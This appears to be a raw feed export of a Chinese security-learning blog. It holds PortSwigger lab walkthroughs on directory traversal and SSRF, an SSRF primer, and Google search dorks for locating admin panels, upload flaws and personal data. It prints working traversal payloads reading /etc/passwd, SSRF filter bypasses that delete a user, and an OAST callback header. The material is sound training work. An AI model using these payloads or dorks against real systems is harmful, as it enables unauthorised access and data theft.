/image?filename=..%252f..%252f..%252fetc/passwd HTTP/2</span><br><span class="line">Host: 0a8a0010031444fc8446d12200cb00f0.web-security-academy.net</span><br><span class="line">Cookie: session=0AtWPrhHQhcvRG5aRcVjlPH2mgr1rZ97</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a8a0010031444fc8446d12200cb00f0.web-security-academy.net/</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure><h3 id="验证路径开头"><a href="#验证路径开头" class="headerlink" title="验证路径开头"></a>验证路径开头</h3><p>如果应用程序要求用户提供的文件名必须以预期的基本文件夹开头，例如<code>/var/www/images</code>，则可以包含所需的基本文件夹，后跟合适的遍历序列。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>如果把所需的基本文件夹去掉就会提示（缺少参数“文件名”）,所以要加上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2</span><br><span class="line">Host: 0a030073038044a28436d63200480044.web-security-academy.net</span><br><span class="line">Cookie: session=cxkkHxwtCwJueBPUdHhGulYZMYdEmvMV</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a030073038044a28436d63200480044.web-security-academy.net/</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure><h3 id="空字节绕过验证文件扩展名"><a href="#空字节绕过验证文件扩展名" class="headerlink" title="空字节绕过验证文件扩展名"></a>空字节绕过验证文件扩展名</h3><p>如果应用程序要求用户提供的文件名必须以预期的文件扩展名结尾，例如<code>.png</code>，则可以使用空字节在所需扩展名之前有效地终止文件路径。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../../etc/passwd%00.png</span><br></pre></td></tr></table></figure><p>有点像文件上传中get方式的00截断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /image?filename=../../../etc/passwd%00.png HTTP/2</span><br><span class="line">Host: 0a820088043cb2468357f16e00af009b.web-security-academy.net</span><br><span class="line">Cookie: session=GLZ96R5x8EEDG3gcyvUUpstpVDdrkyBX</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://0a820088043cb2468357f16e00af009b.web-security-academy.net/</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 目录遍历漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF相关靶场通关</title>
      <link href="/2023/08/05/SSRF%E7%9B%B8%E5%85%B3%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
      <url>/2023/08/05/SSRF%E7%9B%B8%E5%85%B3%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="来自portswigger靶场"><a href="#来自portswigger靶场" class="headerlink" title="来自portswigger靶场"></a>来自portswigger靶场</h1><h2 id="常见的SSRF攻击"><a href="#常见的SSRF攻击" class="headerlink" title="常见的SSRF攻击"></a>常见的SSRF攻击</h2><h3 id="针对服务器本身的SSRF攻击"><a href="#针对服务器本身的SSRF攻击" class="headerlink" title="针对服务器本身的SSRF攻击"></a>针对服务器本身的SSRF攻击</h3><p>根据提示有一个检查库存的功能，然后向服务器端发送一个后端请求，登陆后并删除carlos用户。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051430458.png"></p><p>随机点开一个商品页面查看库存抓包，可以看到有个stocApi向另一台主机发送了查看库存的请求。我们可以将他改为回环地址，因为回环地址和服务器有着互相信任的原则，就直接访问。（在没有任何安全保护的机制下）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0a51008604bdf2e18208744d00af002e.web-security-academy.net</span><br><span class="line">Cookie: session=b08dexoHEiX10nl2GkWJGbIhjJGSfUZ8</span><br><span class="line">Content-Length: 107</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://0a51008604bdf2e18208744d00af002e.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0a51008604bdf2e18208744d00af002e.web-security-academy.net/product?productId=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1</span><br></pre></td></tr></table></figure><p>改包，成功进去后台。但是还要进行用户删除。如果直接点击delete 会提示 仅当以管理员身份登录或从环回请求时，管理界面才可用。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051443813.png"></p><p>可以按f12 找到delete这个链接的请求拼接到回环请求地址后面。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051448927.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0a51008604bdf2e18208744d00af002e.web-security-academy.net</span><br><span class="line">Cookie: session=b08dexoHEiX10nl2GkWJGbIhjJGSfUZ8</span><br><span class="line">Content-Length: 54</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://0a51008604bdf2e18208744d00af002e.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0a51008604bdf2e18208744d00af002e.web-security-academy.net/product?productId=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin/delete?username=carlos</span><br></pre></td></tr></table></figure><p>成功过关</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051449791.png"></p><h3 id="针对另一个后端系统的SSRF漏洞"><a href="#针对另一个后端系统的SSRF漏洞" class="headerlink" title="针对另一个后端系统的SSRF漏洞"></a>针对另一个后端系统的SSRF漏洞</h3><p>根据提示有一个检查库存的功能，在192.168.0.x上的8080端口有一个管理界面。并删除carlos用户</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051455780.png"></p><p>向192.168.0.1发送了一个后端请求响应是400说明这个ip地址上不存在后端界面，只能使用爆破</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051502884.png"></p><p>将192.168.0.1的1设置为变量有效载荷设置为数字从1到255进行爆破。from、to和step框中分别输入 1、255 和 1</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051504793.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051505709.png"></p><p>找到状态码为200的，查看后为后台地址。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308051510033.png"></p><p>进行用户删除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0a14001f0452f22d82939223007a0089.web-security-academy.net</span><br><span class="line">Cookie: session=d3hAdBrTOPk7M4uqCXKW9a81vDfNcTUA</span><br><span class="line">Content-Length: 68</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://0a14001f0452f22d82939223007a0089.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0a14001f0452f22d82939223007a0089.web-security-academy.net/product?productId=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">stockApi=http://192.168.0.50:8080/admin/admin/delete?username=carlos</span><br></pre></td></tr></table></figure><h3 id="黑名单机制绕过"><a href="#黑名单机制绕过" class="headerlink" title="黑名单机制绕过"></a>黑名单机制绕过</h3><p>某些应用程序会阻止包含主机名（如<code>127.0.0.1</code>和<code>localhost</code>）或敏感 URL 如 输入<code>/admin</code>。在这种情况下，您通常可以使用各种技术来绕过过滤器：</p><p>1.使用<code>127.0.0.1</code>的替代IP表示，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>。</p><p>2.注册一个你自己的域名，它将解析为<code>127.0.0.1</code>。为此，你可以使用<code>spoofed.burpcollaborator.net</code>。</p><p>3.使用URL编码或大小写变化来混淆被阻止的字符串。</p><p>4.提供一个由你控制的URL，并将其重定向到目标URL。尝试使用不同的重定向代码，以及目标URL的不同协议。例如，在重定向期间将<code>http:</code>切换为<code>https:</code>已被证明可以绕过某些反SSRF的过滤。</p><p>根据提示发现和第一个靶场没什么区别就多了一个防御机制</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308052209222.png"></p><p>如用回环地址发送会被服务器阻止访问</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308052201001.png"></p><p>可以使用127.1。 使用ping 命名ping127.1 发现是可以ping 通的</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308052206930.png"></p><p>构造如下数据包访问后端，最后还是无法访问，说明admin检测为敏感字符。使用双URL编码绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0aac002404903276808bc60f00690075.web-security-academy.net</span><br><span class="line">Cookie: session=5xQFfZs0FT0PXhIPqnZw0bIGVGnkIp9K</span><br><span class="line">Content-Length: 28</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://0aac002404903276808bc60f00690075.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0aac002404903276808bc60f00690075.web-security-academy.net/product?productId=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">stockApi=http://127..1/admin</span><br></pre></td></tr></table></figure><p>把a进行%2561 . %25 代表 %  61表示为a</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0aac002404903276808bc60f00690075.web-security-academy.net</span><br><span class="line">Cookie: session=5xQFfZs0FT0PXhIPqnZw0bIGVGnkIp9K</span><br><span class="line">Content-Length: 28</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://0aac002404903276808bc60f00690075.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0aac002404903276808bc60f00690075.web-security-academy.net/product?productId=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">stockApi=http://127.1/%2561dmin</span><br></pre></td></tr></table></figure><p>发现成功了</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308052214982.png"></p><p>才次将删除用户名请求拼接即可</p><h3 id="白名单机制绕过"><a href="#白名单机制绕过" class="headerlink" title="白名单机制绕过"></a>白名单机制绕过</h3><p>和黑名单相比，白名单难度更大一些。</p><p>一些应用程序只允许输入与白名单中的值相匹配、以某些值开头或包含某些值。在这种情况下，有时可以通过利用URL解析中的一致性来绕过过滤。</p><p>URL规范包含了很多在对URL进行自定义的解析和验证时容易被忽略的特性：</p><p>1.你可以在主机名之前使用<code>@</code>字符将凭证嵌入URL中。例如：</p><p>​              <a href="https://expected-host:fakepassword@evil-host/">https://expected-host:fakepassword@evil-host</a>   （在URL中将凭证嵌入主机名之前使用<code>@</code>字符是一种URL传递凭证的方式。然而，这种方式不是推荐的安全做法   列如用户名是admin 密码是 jion   那么可以写成 <a href="https://admin:jion@evil-host)/">https://admin:jion@evil-host）</a></p><p>2.你可以使用<code>#</code>字符来表示URL片段。例如：</p><p>​               <a href="https://evil-host/#expected-host">https://evil-host#expected-host</a></p><p>3.你可以利用DNS命名层次结构，将所需输入放入由你控制的完全限定域名中。例如：</p><p>​              <a href="https://expected-host.evil-host/">https://expected-host.evil-host</a></p><p>4.你可以对字符进行URL编码以混淆URL解析代码。如果实现过滤的代码和执行后端HTTP请求的代码处理URL编码字符的方式不同，那么这种方法尤其有用。请注意，你也可以尝试对字符进行双重编码；一些服务器会对收到的输入进行递归URL解码，这可能会导致进一步的差异。</p><p>5.你可以将这些技术结合起来使用。</p><p>靶场提示和上面一样，先进行抓包和之前一样使用内网地址访问。提示地址必须是“stock.weliketoshop.net”。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308071438025.png"></p><p>结合上面的方法插入@ 字符 这一步是为了测试URL解析器是否支持嵌入凭据。在URL中嵌入凭据是一种传递用户凭证的方式。</p><p>虽然提示无法连接到服务器，但说明了支持用户凭证的插入</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308071442011.png"></p><p>接着插入#测试应用程序是否正确地处理URL中的特殊字符。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308071445120.png"></p><p> 进行双重URL编码，构造<a href="http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos">http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</a></p><ul><li><p><code>http://localhost:80%2523</code>: 这部分是目标服务器的主机和端口信息。在这里，<code>localhost</code>代表本地主机，<code>80</code>是端口号，<code>%2523</code>代表URL编码的<code>#</code>字符。URL编码是为了绕过可能存在的安全防御，尝试将<code>#</code>字符嵌入URL中。</p></li><li><p><code>@stock.weliketoshop.net</code>: 这部分是在URL中嵌入的用户名，通过在<code>@</code>字符后面添加用户名，尝试传递凭据给目标应用程序。</p></li><li><p><code>/admin/delete?username=carlos</code>: 这部分是目标应用程序的删除用户的端点和查询参数。通过在查询参数中添加<code>username=carlos</code>，试图删除用户名为<code>carlos</code>的用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/2</span><br><span class="line">Host: 0a5e00ad0457082880384ecd004c0018.web-security-academy.net</span><br><span class="line">Cookie: session=Mv9GZlMT43bjVrp72epQMq62RzTzfvDc</span><br><span class="line">Content-Length: 52</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://0a5e00ad0457082880384ecd004c0018.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0a5e00ad0457082880384ecd004c0018.web-security-academy.net/product?productId=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</span><br></pre></td></tr></table></figure></li></ul><h2 id="SSRF盲漏洞"><a href="#SSRF盲漏洞" class="headerlink" title="SSRF盲漏洞"></a>SSRF盲漏洞</h2><p>有时候ssrf存在,但是你无法查看后端的响应。只能借助OAST（把响应的内容返回到这个上面），在burp自带了Burp Collaborator。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308072102411.png"></p><p>打开如下，点击cpoy to clipboard </p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202308072115341.png"></p><p>粘贴到Referer标头，发送</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product?productId=1 HTTP/2</span><br><span class="line">Host: 0a7900f003d4c7e584e1820700d1000a.web-security-academy.net</span><br><span class="line">Cookie: session=yY6nmZrMwG7giR1hj8V2P5YaECL3iosP</span><br><span class="line">Sec-Ch-Ua: &quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: uomvimb7mwpybeq4fobjlkyc53btzi.oastify.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞学习记录</title>
      <link href="/2023/07/31/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/31/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF漏洞介绍"><a href="#SSRF漏洞介绍" class="headerlink" title="SSRF漏洞介绍"></a>SSRF漏洞介绍</h1><p>SSRF：服务器端请求伪造，是攻击者滥用服务器功能来访问或操作无法被直接访问的信息的方式之一。</p><h2 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h2><p>1.可直接访问内网，读取敏感信息和文件。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>访问服务器A资源时对另一台服务器B发起资源访问，但是没有对用户的输入进行处理，导致了可以进行内网的访问。</p><p>比如你在A站访问了一张图片资源，但这张图片资源地址在B服务器上。A就会向B发起资源请求。（以上是个人解释，看下比较官方的解释）</p><p>服务器端请求伪造（也称为 SSRF）是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向非预期位置发出请求。</p><p>在典型的 SSRF 攻击中，攻击者可能会导致服务器连接到组织基础设施内的仅供内部使用的服务。在其他情况下，他们可能能够强制服务器连接到任意外部系统，从而可能泄露授权凭据等敏感数据。</p><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>考虑一个购物应用程序，它允许用户查看特定商店中是否有商品的库存。为了提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递到相关后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure><p>这会导致服务器向指定的 URL 发出请求，检索库存状态，并将其返回给用户。</p><p>在这种情况下，攻击者可以修改请求以指定服务器本身本地的 URL。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure><p>在这里，服务器将获取<code>/admin</code>URL 的内容并将其返回给用户。</p><p>当然，现在攻击者可以<code>/admin</code>直接访问该 URL。但管理功能通常只有经过适当身份验证的用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。然而，当对 URL 的请求<code>/admin</code>来自本地计算机本身时，正常的访问控制就会被绕过。应用程序授予对管理功能的完全访问权限，因为请求似乎源自受信任的位置。</p><h2 id="会出现的地方"><a href="#会出现的地方" class="headerlink" title="会出现的地方"></a>会出现的地方</h2><ol><li><p>转码服务</p></li><li><p>在线翻译</p></li><li><p>图片加载与下载(通过URL地址加载或下载图片)</p></li><li><p>图片、文章收藏功能</p></li><li><p>网站采集、网页抓取的地方。</p></li><li><p>头像的地方。(远程加载头像)</p></li><li><p>一切要你输入网址的地方和可以输入ip的地方。</p></li><li><p>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code><br>…</p></li></ol><h2 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h2><p>通过各种协议和函数对服务器进行操作。</p><p>1.file:&#x2F;&#x2F;   </p><p>2.gopher</p><p>3.dict</p><p>函数</p><p>file_get_contents()</p><p> fsockopen() </p><p>curl_exec() </p><p>SoapClient</p><h3 id="file协议："><a href="#file协议：" class="headerlink" title="file协议："></a>file协议：</h3><p>文件读取协议主要结合目录遍历。</p><p>格式：ile:&#x2F;&#x2F;&#x2F;文件路径</p><h3 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h3><p>主要用来探测对方机器开放的端口</p><p>格式：</p><p>dict:&#x2F;&#x2F;host:port</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集相关</title>
      <link href="/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/"/>
      <url>/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：web安全最主要的就是信息收集，这篇文章用于记录"><a href="#前言：web安全最主要的就是信息收集，这篇文章用于记录" class="headerlink" title="#前言：web安全最主要的就是信息收集，这篇文章用于记录"></a>#前言：web安全最主要的就是信息收集，这篇文章用于记录</h1><h2 id="常用的谷歌语法"><a href="#常用的谷歌语法" class="headerlink" title="常用的谷歌语法"></a>常用的谷歌语法</h2><p>site：可以限制你搜索范围的域名；</p><p>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；</p><p>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)；</p><p>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码；</p><p>filetype：搜索文件的后缀或者扩展名；</p><p>intitle：限制你搜索的网页标题；</p><p>查找后台地址：<br>site:域名inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p><p>查找文本内容：<br>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|admin|login|sys|managetem|password|username</p><p>查找可注入点：<br>site:域名 inurl:aspx|jsp|php|asp</p><p>查找上传漏洞：<br>site:域名 inurl:file|load|editor|Files</p><p>找eweb编辑器：<br>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p><p>存在的数据库：<br>site:域名 filetype:mdb|asp|#</p><p>查看脚本类型：<br>site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp</p><p>迂回策略入侵：<br>inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;</p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>​          site:域名 intext:”忘记密码”</p><p>​          site:域名 intext:”工号”</p><p>​           site:域名 intext:”优秀员工”</p><p>​           site:域名 intext:”身份证号码”</p><p>​            site:域名 intext:”手机号”</p><h2 id="常见状态码："><a href="#常见状态码：" class="headerlink" title="常见状态码："></a>常见状态码：</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>这些是我们请求资源时Web服务器返回的标准状态代码。通常，当服务器向我们提供了我们请求的资源时，即使浏览器没有显示它，因为它显示的是请求的文档，我们也会得到“ 200”（确定）状态码。<br>当出现问题时，如果服务器在特定位置（路径）找不到我们要求的资源，则会收到一条错误消息，通常为“ 404”（找不到页面）。但是，许多“ 404”实际上应报告为“ 410”（已消失），这意味着我们请求的文档实际上已经存在一次，但是已被删除，或者是“ 301”（永久移动）或“ 